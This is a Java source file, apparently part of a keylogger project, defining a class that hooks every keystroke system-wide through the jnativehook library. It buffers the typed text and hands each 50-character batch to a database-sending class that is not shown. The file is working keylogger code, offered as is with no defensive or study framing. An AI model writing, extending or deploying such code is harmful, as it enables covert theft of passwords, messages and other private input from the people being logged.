package tech.leonam;

import com.github.kwhat.jnativehook.keyboard.NativeKeyEvent;
import com.github.kwhat.jnativehook.keyboard.NativeKeyListener;
import tech.leonam.dao.EnviarBd;

public class Capturador implements NativeKeyListener {
    private String aSerEnviado = "";
    private int i = 0;
    public static final int numeroDeCaracteresASerEnviado = 50;

    public static final String[] ESPECIAIS = {
            "backspace",
            "up",
            "down",
            "right",
            "left",
            "tab",
            "enter",
            "esc",
            "comma",
            "shift",
            "quote",
            "alt",
            "back",
            "ctrl",
            "quoteback"
    };

    @Override
    public void nativeKeyPressed(NativeKeyEvent nativeKeyEvent) {

        var letra = NativeKeyEvent.getKeyText(nativeKeyEvent.getKeyCode());

        for(var daVez:ESPECIAIS){
            if(daVez.equals(letra)){
                letra = letra.replace(letra,"_");
            }
        }

        if ("space".equals(letra)) {
            letra = " ";
        }
        aSerEnviado += letra;

        i++;
        if(i >= numeroDeCaracteresASerEnviado){
            new EnviarBd(aSerEnviado);
            aSerEnviado = " ";
            i = 0;
        }
    } @Override
    public void nativeKeyReleased(NativeKeyEvent nativeKeyEvent) {
    }

    @Override
    public void nativeKeyTyped(NativeKeyEvent nativeKeyEvent) {
    }
}
